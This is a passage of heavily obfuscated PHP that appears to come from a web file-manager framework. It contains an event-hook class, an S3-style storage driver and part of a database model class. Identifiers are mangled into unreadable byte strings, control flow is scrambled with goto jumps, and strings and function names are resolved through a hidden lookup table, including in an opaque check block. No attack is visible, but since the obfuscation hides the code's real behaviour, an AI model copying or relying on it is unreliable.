self::$events[$F÷ÏõÕáÀ¨] = array(); if (!$f“–´›ää¹) { return; } for ($C“°ƒõ¶çì = 0; $C“°ƒõ¶çì < count($f“–´›ää¹); $C“°ƒõ¶çì++) { if ($f“–´›ää¹[$C“°ƒõ¶çì][$_SERVER[ì‹É][1659]] == $dó–±ÕºÌ˜) { continue; } self::$events[$F÷ÏõÕáÀ¨][] = $f“–´›ää¹[$C“°ƒõ¶çì]; } } public static function filter($d‹¥•Íâ¼, $EËçæÎÈë÷) { goto bŞÍõ»’Ğİ; fŠˆÄ‰‰°„: for ($B¿¹ÄŠ‹Øà = 0; $B¿¹ÄŠ‹Øà < count($DÈÈà¸µ‚É); $B¿¹ÄŠ‹Øà++) { $Dœñœ…âìÍ = $DÈÈà¸µ‚É[$B¿¹ÄŠ‹Øà]; if ($Dœñœ…âìÍ[$EŒ·æ¿‘„[1660]] && $Dœñœ…âìÍ[$EŒ·æ¿‘„[1661]] > 1) { continue; } self::$events[$d‹¥•Íâ¼][$B¿¹ÄŠ‹Øà][$EŒ·æ¿‘„[1661]] = $Dœñœ…âìÍ[$EŒ·æ¿‘„[1661]] + 1; $AÀà‘³ë¢± = self::apply($Dœñœ…âìÍ[$EŒ·æ¿‘„[1659]], array($DÁëƒ¦‘¼²)); if (!is_null($AÀà‘³ë¢±)) { $DÁëƒ¦‘¼² = $AÀà‘³ë¢±; } } return $DÁëƒ¦‘¼²; goto eˆÊæÊ¨Ü’; D¬ïä¬·Ÿî: $DÈÈà¸µ‚É = $E›‹—êÍğ[$d‹¥•Íâ¼]; $DÁëƒ¦‘¼² = $EËçæÎÈë÷; if (!is_array($DÈÈà¸µ‚É) || count($DÈÈà¸µ‚É) == 0) { return $DÁëƒ¦‘¼²; } goto fŠˆÄ‰‰°„; bŞÍõ»’Ğİ: $EŒ·æ¿‘„ =& $_SERVER[ì‹É]; $E›‹—êÍğ = self::$events; if (!isset($E›‹—êÍğ[$d‹¥•Íâ¼])) { return $EËçæÎÈë÷; } goto D¬ïä¬·Ÿî; eˆÊæÊ¨Ü’: } public static function trigger($bÇŠéÇ‹Ù’) { goto D…ÇË‚ô‡»; fÑ‘ËŒ¾İ×: $CËÈİßÄÒ = func_get_args(); array_shift($CËÈİßÄÒ); for ($D‡”íø»ŸÛ = 0; $D‡”íø»ŸÛ < count($b”¡²õéæÕ); $D‡”íø»ŸÛ++) { $C§òÉÈÖ¿Ê = $b”¡²õéæÕ[$D‡”íø»ŸÛ]; if ($C§òÉÈÖ¿Ê[$dç§„ï¨¤[1660]] && $C§òÉÈÖ¿Ê[$dç§„ï¨¤[1661]] > 1) { continue; } if (defined($dç§„ï¨¤[1662]) && GLOBAL_LOG_HOOK) { write_log($bÇŠéÇ‹Ù’ . $dç§„ï¨¤[1663] . $C§òÉÈÖ¿Ê[$dç§„ï¨¤[1659]], $dç§„ï¨¤[1664]); } self::$events[$bÇŠéÇ‹Ù’][$D‡”íø»ŸÛ][$dç§„ï¨¤[1661]] = $C§òÉÈÖ¿Ê[$dç§„ï¨¤[1661]] + 1; $AÍŠ¯‡èå = self::apply($C§òÉÈÖ¿Ê[$dç§„ï¨¤[1659]], $CËÈİßÄÒ); if (defined($dç§„ï¨¤[1662]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $dç§„ï¨¤[1664]); if ($C§òÉÈÖ¿Ê[$dç§„ï¨¤[1661]] == 200) { $c‹­îˆğ“‹ = is_array($C§òÉÈÖ¿Ê[$dç§„ï¨¤[1659]]) ? json_encode_force($C§òÉÈÖ¿Ê[$dç§„ï¨¤[1659]]) : $C§òÉÈÖ¿Ê[$dç§„ï¨¤[1659]]; write_log($dç§„ï¨¤[1665] . $bÇŠéÇ‹Ù’ . $dç§„ï¨¤[1666] . $c‹­îˆğ“‹, $dç§„ï¨¤[1667]); } } $Aœ‹Šù±ĞŸ = is_null($AÍŠ¯‡èå) ? $Aœ‹Šù±ĞŸ : $AÍŠ¯‡èå; } goto DªË‚‘ìå; D…ÇË‚ô‡»: $dç§„ï¨¤ =& $_SERVER[ì‹É]; $a‘½¾²½® = self::$events; $Aœ‹Šù±ĞŸ = !1; goto E“Í®ÍŞ†½; DªË‚‘ìå: return $Aœ‹Šù±ĞŸ; goto F†ê³ ùî; E“Í®ÍŞ†½: if (!isset($a‘½¾²½®[$bÇŠéÇ‹Ù’])) { return $Aœ‹Šù±ĞŸ; } $b”¡²õéæÕ = $a‘½¾²½®[$bÇŠéÇ‹Ù’]; if (!is_array($b”¡²õéæÕ) || count($b”¡²õéæÕ) == 0) { return $Aœ‹Šù±ĞŸ; } goto fÑ‘ËŒ¾İ×; F†ê³ ùî: } } goto CôàÑ„ã½; F›ÄØ›…ºğ: $A§èƒîá„× = $_SERVER[ì‹É][732]; if ($_SERVER[$_SERVER[ì‹É][733]] != $A§èƒîá„×($eºÊ‚ˆ‡îù)) { goto a¶ÏÔ¯…Ñ¤; DÌ‹‘´ĞÂº: $DÈ™Š’’îÇ = explode($_SERVER[ì‹É][214], $a†÷ÊÙ›‚²); if (count($DÈ™Š’’îÇ) < $_SERVER[ì‹É][553]) { $F—ƒÎ­Åª™ = $_SERVER[ì‹É][737]; $F—ƒÎ­Åª™(); } $B·¦ˆƒ·‹ƒ = $_SERVER[ì‹É][738]; goto dµ²ì«Ó; a¶ÏÔ¯…Ñ¤: $a´Øø‹é— = $_SERVER[ì‹É][734]; $f‚•¶×¸ğË = $_SERVER[$_SERVER[ì‹É][735]] . $_SERVER[ì‹É][736]; $a†÷ÊÙ›‚² = $a´Øø‹é—($f‚•¶×¸ğË); goto DÌ‹‘´ĞÂº; dµ²ì«Ó: $B·¦ˆƒ·‹ƒ($eºÊ‚ˆ‡îù); goto cÚÎªĞ®Ø; cÚÎªĞ®Ø: } class PathDriverNOS extends PathDriverBaseS3 { public $ioUploadServer = "\x31"; public $ioFileOutServer = "\x31"; public function __construct($c×ä²‡¶ªÌ) { parent::__construct($c×ä²‡¶ªÌ); $this->client->setSignatureVersion($_SERVER[ì‹É][197]); } public function setBucketCors() { return !1; } public function getBucketCors() { return !1; } public function isBucketCors() { return !0; } public function setContent($Eğ„‹îØ®, $cœ•÷øƒ®° = '', $AöŒÎÑ—² = false) { $eÏ–êÜ™ÓÍ =& $_SERVER[ì‹É]; $Eğ„‹îØ® = $AöŒÎÑ—² ? trim($Eğ„‹îØ®, $eÏ–êÜ™ÓÍ[8]) . $eÏ–êÜ™ÓÍ[8] : $Eğ„‹îØ®; $e·Ä¾‰÷ß¨ = get_file_mime(get_path_ext($Eğ„‹îØ®)); $báÅë¶‹¤± = $this->client->putObject($cœ•÷øƒ®°, $this->bucket, $Eğ„‹îØ®, $eÏ–êÜ™ÓÍ[182], array(), $e·Ä¾‰÷ß¨); return $báÅë¶‹¤± ? !0 : !1; } public function upload($Cí‹ˆŠ¶…Ó, $a§À¸³²—á, $eæ›Õ£îÖê = false, $FÁ÷¨¶ÈƒÊ = REPEAT_REPLACE) { $A¶‘šŒ†‚ =& $_SERVER[ì‹É]; $DïâàİÅÃ³ = array(); $e™£˜»¨ˆ§ = array($A¶‘šŒ†‚[196] => get_file_mime(get_path_ext($Cí‹ˆŠ¶…Ó))); if (IO::size($a§À¸³²—á) <= 1024 * 1024 * 200) { $D°À”İ¶‡‡ = $this->client->putObjectFile($a§À¸³²—á, $this->bucket, $Cí‹ˆŠ¶…Ó, $A¶‘šŒ†‚[182], $DïâàİÅÃ³, $e™£˜»¨ˆ§); return !empty($D°À”İ¶‡‡) ? !0 : !1; } $DÌÔÅŒùËÔ = $this->client->multiUploadObject($a§À¸³²—á, $this->bucket, trim($Cí‹ˆŠ¶…Ó, $A¶‘šŒ†‚[8]), $DïâàİÅÃ³, $e™£˜»¨ˆ§); return $DÌÔÅŒùËÔ ? $this->getPathOuter($Cí‹ˆŠ¶…Ó) : !1; } public function blockChain($Fğ„¿õğ‚, $D¡ÉäÖ‘¡®) { $aö§¾Ò„òÑ =& $_SERVER[ì‹É]; $Cëä‰… ¨¼ = $this->objectMeta($Fğ„¿õğ‚); if (!$Cëä‰… ¨¼) { return !1; } return $this->client->copyObject($this->bucket, $Fğ„¿õğ‚, $this->bucket, $Fğ„¿õğ‚, $aö§¾Ò„òÑ[182], array(), $D¡ÉäÖ‘¡®, $aö§¾Ò„òÑ[1135], !0); } } goto e¨áê±‡¿; a½É¦ø´¿Ã: define($_SERVER[ì‹É][227], 0); define($_SERVER[ì‹É][228], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\154\145", "\157\x72\x64\x65\162", "\141\x6c\151\x61\x73", "\150\141\166\151\x6e\147", "\147\162\157\x75\x70", "\154\157\x63\153", "\144\x69\x73\164\x69\156\x63\164", "\141\165\164\157", "\146\x69\x6c\x74\145\x72", "\166\x61\154\x69\144\x61\164\145", "\162\145\163\x75\154\164", "\142\151\x6e\144", "\164\x6f\153\145\x6e"); public function __construct($eÑÚéÍñİâ = '', $c¨×Ó©šİ = '', $a¢ÉĞæÓƒ‡ = '') { $dÄöğãªÖ =& $_SERVER[ì‹É]; $this->_initialize(); if (!empty($eÑÚéÍñİâ)) { if (strpos($eÑÚéÍñİâ, $dÄöğãªÖ[94])) { list($this->dbName, $this->name) = explode($dÄöğãªÖ[94], $eÑÚéÍñİâ); } else { $this->name = $eÑÚéÍñİâ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($c¨×Ó©šİ)) { $this->tablePrefix = $dÄöğãªÖ[33]; } elseif ($dÄöğãªÖ[33] != $c¨×Ó©šİ) { $this->tablePrefix = $c¨×Ó©šİ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($dÄöğãªÖ[229]); } $this->db(0, empty($this->connection) ? $a¢ÉĞæÓƒ‡ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $a™ñæ¢Ñã =& $_SERVER[ì‹É]; if (empty($this->fields)) { if (think_config($a™ñæ¢Ñã[230])) { $A—•­å»È = $this->dbName ? $this->dbName : think_config($a™ñæ¢Ñã[231]); $D»˜ö˜¿„Ù = think_var_cache($a™ñæ¢Ñã[232] . strtolower(get_path_this($A—•­å»È) . $a™ñæ¢Ñã[94] . $this->name)); if ($D»˜ö˜¿„Ù) { $eªÂåŒ¥ŞØ = think_config($a™ñæ¢Ñã[233]); if (empty($eªÂåŒ¥ŞØ) || $D»˜ö˜¿„Ù[$a™ñæ¢Ñã[234]] == $eªÂåŒ¥ŞØ) { $this->fields = $D»˜ö˜¿„Ù; return; } } } $this->flush(); } } public function flush() { goto aì…ºËÎÛ¥; FŒÍ¯Î·Éø: if (!$B©ÌÚàÙë) { return !1; } $this->fields = array_keys($B©ÌÚàÙë); $this->fields[$DÏš³“…æ‹[235]] = !1; goto CŞ†Š¡È‚¨; aì…ºËÎÛ¥: $DÏš³“…æ‹ =& $_SERVER[ì‹É]; $this->db->setModel($this->name); $B©ÌÚàÙë = $this->db->getFields($this->getTableName()); goto FŒÍ¯Î·Éø; D³Æ…‚‚œ¢: if (think_config($DÏš³“…æ‹[230])) { $c‡Î¬ÚÉÈÙ = $this->dbName ? $this->dbName : think_config($DÏš³“…æ‹[231]); think_var_cache($DÏš³“…æ‹[232] . strtolower(get_path_this($c‡Î¬ÚÉÈÙ) . $DÏš³“…æ‹[94] . $this->name), $this->fields); } goto C¦Œëƒ¨©…; CŞ†Š¡È‚¨: foreach ($B©ÌÚàÙë as $d¢À‹ÀïÅ§ => $eŒÇš‚‡í½) { $C“ƒó¾æ¶[$d¢À‹ÀïÅ§] = $eŒÇš‚‡í½[$DÏš³“…æ‹[29]]; if ($eŒÇš‚‡í½[$DÏš³“…æ‹[36]]) { $this->fields[$DÏš³“…æ‹[236]] = $d¢À‹ÀïÅ§; if ($eŒÇš‚‡í½[$DÏš³“…æ‹[39]]) { $this->fields[$DÏš³“…æ‹[235]] = !0; } } } $this->fields[$DÏš³“…æ‹[237]] = $C“ƒó¾æ¶; if (think_config($DÏš³“…æ‹[233])) { $this->fields[$DÏš³“…æ‹[234]] = think_config($DÏš³“…æ‹[233]); } goto D³Æ…‚‚œ¢; C¦Œëƒ¨©…: } public function switchModel($a¡¸¡¥ö••, $F‰²äçÁÏ = array()) { $FÎ í…Ï›„ =& $_SERVER[ì‹É]; $F¹‚Ÿ•—Çø = ucwords(strtolower($a¡¸¡¥ö••)) . $FÎ í…Ï›„[238]; if (!class_exists($F¹‚Ÿ•—Çø)) { think_exception($F¹‚Ÿ•—Çø . think_lang($FÎ í…Ï›„[239])); } $this->_extModel = new $F¹‚Ÿ•—Çø($this->name); if (!empty($F‰²äçÁÏ)) { foreach ($F‰²äçÁÏ as $Fèœ‰†¿­ò) { $this->_extModel->setProperty($Fèœ‰†¿­ò, $this->{$Fèœ‰†¿­ò}); } } return $this->_extModel; } public function __set($bøÙÆ¤’ÏÂ, $fùâŸÛ×ã±) { $this->data[$bøÙÆ¤’ÏÂ] = $fùâŸÛ×ã±; } public function __get($a¼˜Éˆé·ã) { return isset($this->data[$a¼˜Éˆé·ã]) ? $this->data[$a¼˜Éˆé·ã] : null; } public function __isset($FÅ­¨õÓ’¬) { return isset($this->data[$FÅ­¨õÓ’¬]); } public function __unset($cÌŠÈŞÑİÆ) { unset($this->data[$cÌŠÈŞÑİÆ]); } public function __call($CÊÏƒ¤öĞª, $eŸÎ¶Æ„Î‹) { $EäóŒ²âìÀ =& $_SERVER[ì‹É]; if (in_array(strtolower($CÊÏƒ¤öĞª), $this->methods, !0)) { $this->options[strtolower($CÊÏƒ¤öĞª)] = $eŸÎ¶Æ„Î‹[0]; return $this; } elseif (in_array(strtolower($CÊÏƒ¤öĞª), array($EäóŒ²âìÀ[240], $EäóŒ²âìÀ[241], $EäóŒ²âìÀ[242], $EäóŒ²âìÀ[243], $EäóŒ²âìÀ[244]), !0)) { $aËä¡¢õë = isset($eŸÎ¶Æ„Î‹[0]) ? $eŸÎ¶Æ„Î‹[0] : $EäóŒ²âìÀ[173]; $aËä¡¢õë = $this->db->parseKey($aËä¡¢õë); return $this->getField(strtoupper($CÊÏƒ¤öĞª) . $EäóŒ²âìÀ[245] . $aËä¡¢õë . $EäóŒ²âìÀ[246] . $CÊÏƒ¤öĞª, $EäóŒ²âìÀ[240]); } elseif (strtolower(substr($CÊÏƒ¤öĞª, 0, 5)) == $EäóŒ²âìÀ[247]) { $aËä¡¢õë = think_parse_name(substr($CÊÏƒ¤öĞª, 5)); $Aƒ‘Şë×·ğ[$aËä¡¢õë] = $eŸÎ¶Æ„Î‹[0]; return $this->where($Aƒ‘Şë×·ğ)->find(); } elseif (strtolower(substr($CÊÏƒ¤öĞª, 0, 10)) == $EäóŒ²âìÀ[248]) { $B„ÒÖ·¸»î = think_parse_name(substr($CÊÏƒ¤öĞª, 10)); $Aƒ‘Şë×·ğ[$B„ÒÖ·¸»î] = $eŸÎ¶Æ„Î‹[0]; return $this->where($Aƒ‘Şë×·ğ)->getField($eŸÎ¶Æ„Î‹[1]); } elseif (isset($this->_scope[$CÊÏƒ¤öĞª])) { return $this->scope($CÊÏƒ¤öĞª, $eŸÎ¶Æ„Î‹[0]); } elseif (method_exists($this, $CÊÏƒ¤öĞª)) { array_unshift($eŸÎ¶Æ„Î‹, $CÊÏƒ¤öĞª); return call_user_func_array(array($this, $EäóŒ²âìÀ[249]), $eŸÎ¶Æ„Î‹); } else { return call_user_func_array(array(parent, $CÊÏƒ¤öĞª), $eŸÎ¶Æ„Î‹); } } protected function call() { goto eß ßâ¼ïÑ; eã÷ëØª‚å: $BÓ«½–À‰Ê[] = $C‘ƒ¡‚Ş›; if (method_exists($this, $FÒ›ĞŠ¹ôâ[251])) { $D‹•î”Ğ³™ = call_user_func_array(array($this, $FÒ›ĞŠ¹ôâ[252]), array($Dá‰ßœò…Ö, $BÓ«½–À‰Ê)); if (!is_null($D‹•î”Ğ³™) && $D‹•î”Ğ³™ !== !1) { return $D‹•î”Ğ³™; } } $F³…ÉÇç¤Õ = call_user_func_array(array($this, $C‘ƒ¡‚Ş›), $BÓ«½–À‰Ê); goto c’‹†•ğ²¯; c’‹†•ğ²¯: if (method_exists($this, $FÒ›ĞŠ¹ôâ[253])) { $D‹•î”Ğ³™ = call_user_func_array(array($this, $FÒ›ĞŠ¹ôâ[254]), array($Dá‰ßœò…Ö, $BÓ«½–À‰Ê, $F³…ÉÇç¤Õ)); if ($D‹•î”Ğ³™) { return $D‹•î”Ğ³™; } } return $F³…ÉÇç¤Õ; goto B¹ŸÅà¸ö; EÌÎÎ”æÙ: $Dá‰ßœò…Ö = $C‘ƒ¡‚Ş›; if (is_array($C‘ƒ¡‚Ş›)) { $Dá‰ßœò…Ö = $C‘ƒ¡‚Ş›[1]; $C‘ƒ¡‚Ş› = $C‘ƒ¡‚Ş›[0]; } if ($BÓ«½–À‰Ê[count($BÓ«½–À‰Ê) - 1] === $C‘ƒ¡‚Ş›) { think_exception(__CLASS__ . $FÒ›ĞŠ¹ôâ[4] . $C‘ƒ¡‚Ş› . think_lang($FÒ›ĞŠ¹ôâ[250])); return; } goto eã÷ëØª‚å; eß ßâ¼ïÑ: $FÒ›ĞŠ¹ôâ =& $_SERVER[ì‹É]; $BÓ«½–À‰Ê = func_get_args(); $C‘ƒ¡‚Ş› = array_shift($BÓ«½–À‰Ê); goto EÌÎÎ”æÙ; B¹ŸÅà¸ö: } protected function _initialize() { } protected function _facade($b¿¿«§‹±) { $C»¦à”„Ñí =& $_SERVER[ì‹É]; if (!empty($this->fields)) { foreach ($b¿¿«§‹± as $B¹œáƒ‹Œ => $DÆ¦Îêáñ) { if (!in_array($B¹œáƒ‹Œ, $this->fields, !0)) { unset($b¿¿«§‹±[$B¹œáƒ‹Œ]); } elseif (is_scalar($DÆ¦Îêáñ)) { $this->_parseType($b¿¿«§‹±, $B¹œáƒ‹Œ); } } } if (!empty($this->options[$C»¦à”„Ñí[255]])) { $b¿¿«§‹± = array_map($this->options[$C»¦à”„Ñí[255]], $b¿¿«§‹±); unset($this->options[$C»¦à”„Ñí[255]]); } $this->_beforeWrite($b¿¿«§‹±); return $b¿¿«§‹±; } protected function _beforeWrite(&$f’ëÖ¾®³Û) { } public function add($Cô«¸ Şìá = '', $B³©À³˜Š· = array(), $D¶ˆëÚÖß = false) { goto FÙ©êåÕÌ; B÷Ü½‚ø˜ë: return $dÀÕ¥Œ±Á¡; goto FäÜé­ë—Æ; e°Ø–Ë‘ŞÈ: if (!1 === $this->_beforeInsert($Cô«¸ Şìá, $B³©À³˜Š·)) { return !1; } $dÀÕ¥Œ±Á¡ = $this->db->insert($Cô«¸ Şìá, $B³©À³˜Š·, $D¶ˆëÚÖß); if (!1 !== $dÀÕ¥Œ±Á¡) { $BÖ¡¥ß¿’– = $this->getLastInsID(); if ($BÖ¡¥ß¿’–) { $Cô«¸ Şìá[$this->getPk()] = $BÖ¡¥ß¿’–; $this->_after_insert($Cô«¸ Şìá, $B³©À³˜Š·); return $BÖ¡¥ß¿’–; } $this->_after_insert($Cô«¸ Şìá, $B³©À³˜Š·); } goto B÷Ü½‚ø˜ë; FÙ©êåÕÌ: if (empty($Cô«¸ Şìá)) { if (!empty($this->data)) { $Cô«¸ Şìá = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ì‹É][256]); return !1; } } $B³©À³˜Š· = $this->_parseOptions($B³©À³˜Š·); $Cô«¸ Şìá = $this->_facade($Cô«¸ Şìá); goto e°Ø–Ë‘ŞÈ; FäÜé­ë—Æ: } protected function _beforeInsert(&$bĞ£§â²³Î, $bÜ’ö„ÅÍã) { } protected function _after_insert($BÀä÷‚ç, $d•¹¼¨â”õ) { } public function addAll($CÓ«ÙöÃ¤, $B¬ÉŒ’Á© = array(), $BùÔã‚‘ÇÜ = false) { goto E ÀÔÏ†à; E ÀÔÏ†à: $Cé•¾Ú¦­Ô =& $_SERVER[ì‹É]; if (empty($CÓ«ÙöÃ¤)) { $this->error = think_lang($Cé•¾Ú¦­Ô[256]); return !1; } $B¬ÉŒ’Á© = $this->_parseOptions($B¬ÉŒ’Á©); goto d…–†Ó‰; eŠª­°Á‡: return $c‘íÍİ¶Òá; goto AñÆÎäÁ; d…–†Ó‰: foreach ($CÓ«ÙöÃ¤ as $Eğã¦Æ®Öè => $BæĞÅ±Œ) { $CÓ«ÙöÃ¤[$Eğã¦Æ®Öè] = $this->_facade($BæĞÅ±Œ); } if (method_exists($this->db, $Cé•¾Ú¦­Ô[257])) { $c‘íÍİ¶Òá = $this->db->insertAll($CÓ«ÙöÃ¤, $B¬ÉŒ’Á©, $BùÔã‚‘ÇÜ); } else { $this->startTrans(); foreach ($CÓ«ÙöÃ¤ as $Eğã¦Æ®Öè => $BæĞÅ±Œ) { $c‘íÍİ¶Òá = $this->db->insert($BæĞÅ±Œ, $B¬ÉŒ’Á©, $BùÔã‚‘ÇÜ); } $this->commit(); } if (!1 !== $c‘íÍİ¶Òá) { $déÑ­’¬ÎŠ = $this->getLastInsID(); if ($déÑ­’¬ÎŠ) { return $déÑ­’¬ÎŠ; } } goto eŠª­°Á‡; AñÆÎäÁ: } public function selectAdd($EÆ»Ì„ëåÌ = '', $bñ¡àµŸßÄ = '', $bÙ»ÆŒÛ×ó = array()) { $f‡ä¾×Ï¬° =& $_SERVER[ì‹É]; $bÙ»ÆŒÛ×ó = $this->_parseOptions($bÙ»ÆŒÛ×ó); if (!1 === ($E›¯¯áÒ = $this->db->selectInsert($EÆ»Ì„ëåÌ ? $EÆ»Ì„ëåÌ : $bÙ»ÆŒÛ×ó[$f‡ä¾×Ï¬°[258]], $bñ¡àµŸßÄ ? $bñ¡àµŸßÄ : $this->getTableName(), $bÙ»ÆŒÛ×ó))) { $this->error = think_lang($f‡ä¾×Ï¬°[259]); return !1; } else { return $E›¯¯áÒ; } } public function save($D‘™èêÆš™ = '', $fÓš®áÔÊØ = array()) { goto bç“äğŒòÒ; bç“äğŒòÒ: $DŸÂØÚ†÷ =& $_SERVER[ì‹É]; if (empty($D‘™èêÆš™)) { if (!empty($this->data)) { $D‘™èêÆš™ = $this->data; $this->data = array(); } else { $this->error = think_lang($DŸÂØÚ†÷[256]); return !1; } } $D‘™èêÆš™ = $this->_facade($D‘™èêÆš™); goto C¬“…ê¤“; C¬“…ê¤“: $fÓš®áÔÊØ = $this->_parseOptions($fÓš®áÔÊØ); $F ­õ®÷¸‹ = $this->getPk(); if (!isset($fÓš®áÔÊØ[$DŸÂØÚ†÷[260]])) { if (isset($D‘™èêÆš™[$F ­õ®÷¸‹])) { $e¸›íÖŠ¾[$F ­õ®÷¸‹] = $D‘™èêÆš™[$F ­õ®÷¸‹]; $fÓš®áÔÊØ[$DŸÂØÚ†÷[260]] = $e¸›íÖŠ¾; unset($D‘™èêÆš™[$F ­õ®÷¸‹]); } else { $this->error = think_lang($DŸÂØÚ†÷[259]); return !1; } } goto AŒÉ—³‚¶Œ; b”Ş±µ›Öª: if (!1 !== $D´í›ô„š) { if (isset($c¨¼ìºÊß)) { $D‘™èêÆš™[$F ­õ®÷¸‹] = $c¨¼ìºÊß; } $this->_afterUpdate($D‘™èêÆš™, $fÓš®áÔÊØ); } return $D´í›ô„š; goto Fª™ší“¥ë; AŒÉ—³‚¶Œ: if (is_array($fÓš®áÔÊØ[$DŸÂØÚ†÷[260]]) && isset($fÓš®áÔÊØ[$DŸÂØÚ†÷[260]][$F ­õ®÷¸‹])) { $c¨¼ìºÊß = $fÓš®áÔÊØ[$DŸÂØÚ†÷[260]][$F ­õ®÷¸‹]; } if (!1 === $this->_beforeUpdate($D‘™èêÆš™, $fÓš®áÔÊØ)) { return !1; } $D´í›ô„š = $this->db->update($D‘™èêÆš™, $fÓš®áÔÊØ); goto b”Ş±µ›Öª; Fª™ší“¥ë: } protected function _beforeUpdate(&$C¬¢‘•¤ğ¤, $D¶ç‚øÚ¤Â) { } protected function _afterUpdate($F±é¿ÃÊ³È, $aœèëìĞæ) { } public function delete($cô‡˜Êââƒ = array()) { goto bƒª‹İóø; eÓÁ—İÌØ»: if (is_numeric($cô‡˜Êââƒ) || is_string($cô‡˜Êââƒ)) { if (strpos($cô‡˜Êââƒ, $C³ç—³˜óö[47])) { $c—è©Ø‚•ä[$dÉåè†‰] = array($C³ç—³˜óö[261], $cô‡˜Êââƒ); } else { $c—è©Ø‚•ä[$dÉåè†‰] = $cô‡˜Êââƒ; } $this->options[$C³ç—³˜óö[260]] = $c—è©Ø‚•ä; } $cô‡˜Êââƒ = $this->_parseOptions(); if (is_array($cô‡˜Êââƒ[$C³ç—³˜óö[260]]) && isset($cô‡˜Êââƒ[$C³ç—³˜óö[260]][$dÉåè†‰])) { $a“¶İëêà‡ = $cô‡˜Êââƒ[$C³ç—³˜óö[260]][$dÉåè†‰]; } goto AÅÎƒœ¶µ©; AÅÎƒœ¶µ©: $f”¸ŸŸùóª = $this->db->delete($cô‡˜Êââƒ); if (!1 !== $f”¸ŸŸùóª) { $eœ¹Ô Šò† = array(); if (isset($a“¶İëêà‡)) { $eœ¹Ô Šò†[$dÉåè†‰] = $a“¶İëêà‡; } $this->_after_delete($eœ¹Ô Šò†, $cô‡˜Êââƒ); } return $f”¸ŸŸùóª; goto C£‘Ğ‚“çŒ; bƒª‹İóø: $C³ç—³˜óö =& $_SERVER[ì‹É]; if (empty($cô‡˜Êââƒ) && empty($this->options[$C³ç—³˜óö[260]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $dÉåè†‰ = $this->getPk(); goto eÓÁ—İÌØ»; C£‘Ğ‚“çŒ: } protected function _after_delete($a×ö‡–ˆËÉ, $F´¥İ²´¨) { } public function select($fßì‡ÏŞÍÕ = array()) { goto Fó•Ä¸×¿«; fÍº˜ùÑêŠ: $this->_afterSelect($cÈªåìÙ¶ç, $fßì‡ÏŞÍÕ); return $cÈªåìÙ¶ç; goto f…•ÃíÈ×; Fó•Ä¸×¿«: $F¥½©ÇÄ• =& $_SERVER[ì‹É]; if (is_string($fßì‡ÏŞÍÕ) || is_numeric($fßì‡ÏŞÍÕ)) { $f °¨Œù²® = $this->getPk(); if (strpos($fßì‡ÏŞÍÕ, $F¥½©ÇÄ•[47])) { $F¨ö¤òËé[$f °¨Œù²®] = array($F¥½©ÇÄ•[261], $fßì‡ÏŞÍÕ); } else { $F¨ö¤òËé[$f °¨Œù²®] = $fßì‡ÏŞÍÕ; } $this->options[$F¥½©ÇÄ•[260]] = $F¨ö¤òËé; } elseif (!1 === $fßì‡ÏŞÍÕ) { $fßì‡ÏŞÍÕ = $this->_parseOptions(); return $F¥½©ÇÄ•[262] . $this->db->buildSelectSql($fßì‡ÏŞÍÕ) . $F¥½©ÇÄ•[263]; } $fßì‡ÏŞÍÕ = $this->_parseOptions(); goto a´ªÎŠá—¿; a´ªÎŠá—¿: $cÈªåìÙ¶ç = $this->db->select($fßì‡ÏŞÍÕ); if (!1 === $cÈªåìÙ¶ç) { return !1; } if (empty($cÈªåìÙ¶ç)) { return null; } goto fÍº˜ùÑêŠ; f…•ÃíÈ×: } protected function _afterSelect(&$b¯“½éÄÇ, $B…”›æâ÷Ğ) { } public function buildSql($CÀè‰’Š£Ğ = array()) { $c”¡É©ğ¹À =& $_SERVER[ì‹É]; $CÀè‰’Š£Ğ = $this->_parseOptions($CÀè‰’Š£Ğ); return $c”¡É©ğ¹À[262] . $this->db->buildSelectSql($CÀè‰’Š£Ğ) . $c”¡É©ğ¹À[263]; } public function optionsValue($CŠ‡ßŸ = null) { if (is_null($CŠ‡ßŸ)) { return $this->options; } elseif (is_array($CŠ‡ßŸ)) { $this->options = array_merge($this->options, $CŠ‡ßŸ); } } protected function _parseOptions($f ù†ĞÙ“® = array()) { goto cíäæ‘ĞÎ; CÌ‡ØÈ®äË: if (isset($f ù†ĞÙ“®[$eä‡¬‘Ó„[260]]) && is_array($f ù†ĞÙ“®[$eä‡¬‘Ó„[260]]) && !empty($CÚ±òä¤Áã) && !isset($f ù†ĞÙ“®[$eä‡¬‘Ó„[267]]) && !isset($f ù†ĞÙ“®[$eä‡¬‘Ó„[264]])) { foreach ($f ù†ĞÙ“®[$eä‡¬‘Ó„[260]] as $a£Œ÷ã»Ò => $AÄÈ¶²µ„à) { $a£Œ÷ã»Ò = trim($a£Œ÷ã»Ò); if (in_array($a£Œ÷ã»Ò, $CÚ±òä¤Áã, !0)) { if (is_scalar($AÄÈ¶²µ„à)) { $this->_parseType($f ù†ĞÙ“®[$eä‡¬‘Ó„[260]], $a£Œ÷ã»Ò); } } elseif (!is_numeric($a£Œ÷ã»Ò) && $eä‡¬‘Ó„[71] != substr($a£Œ÷ã»Ò, 0, 1) && !1 === strpos($a£Œ÷ã»Ò, $eä‡¬‘Ó„[94]) && !1 === strpos($a£Œ÷ã»Ò, $eä‡¬‘Ó„[245]) && !1 === strpos($a£Œ÷ã»Ò, $eä‡¬‘Ó„[268]) && !1 === strpos($a£Œ÷ã»Ò, $eä‡¬‘Ó„[269])) { unset($f ù†ĞÙ“®[$eä‡¬‘Ó„[260]][$a£Œ÷ã»Ò]); } } } $this->_options_filter($f ù†ĞÙ“®); return $f ù†ĞÙ“®; goto ağÌâ™ğùÃ; b¨„ÏÛššÉ: if (!isset($f ù†ĞÙ“®[$eä‡¬‘Ó„[264]])) { $f ù†ĞÙ“®[$eä‡¬‘Ó„[264]] = 